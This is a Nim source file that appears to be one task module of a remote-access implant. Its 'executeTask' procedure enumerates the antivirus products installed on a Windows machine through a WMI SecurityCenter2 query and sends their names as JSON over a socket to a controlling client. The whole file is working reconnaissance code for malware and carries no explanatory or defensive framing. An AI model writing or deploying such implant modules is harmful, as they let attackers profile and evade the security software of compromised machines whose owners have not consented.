from std/net import Socket
import std/[json, jsonutils]

import winim/com
import ../client/communication

proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
  var antiviruses: seq[tuple[name: string]] = @[]
  let taskOutput = newTaskOutput taskId

  var wmi = GetObject "winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\SecurityCenter2"

  for av in wmi.execQuery "select * from AntivirusProduct":
    antiviruses.add (name: $av.displayName)
  
  taskOutput.addData Object, "response", $(toJson antiviruses)
  socket.sendOutput taskOutput